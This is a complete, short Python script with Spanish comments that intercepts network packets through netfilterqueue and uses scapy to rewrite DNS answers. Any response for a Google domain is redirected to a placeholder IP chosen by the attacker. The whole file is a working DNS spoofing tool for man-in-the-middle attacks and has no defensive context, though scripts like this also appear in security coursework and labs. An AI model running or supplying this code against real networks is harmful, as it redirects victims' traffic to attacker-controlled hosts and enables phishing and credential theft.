#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import signal
import sys

def def_handler(sig, frame):
    print(f"\n Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        print("-------------------------------------") 
        print(scapy_packet.show())

        if b"google.com." in qname:
            print(f"\n Envenenando el dominio de Google")
            
            answer = scapy.DNSRR(rrname=qname, rdata="IPDESTINO") #Ingresar IP a donde se redirigira el trafico
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum

            if scapy_packet.haslayer(scapy.UDP): 
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
            elif scapy_packet.haslayer(scapy.TCP):
                del scapy_packet[scapy.TCP].chksum

            packet.set_payload(scapy_packet.build())

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
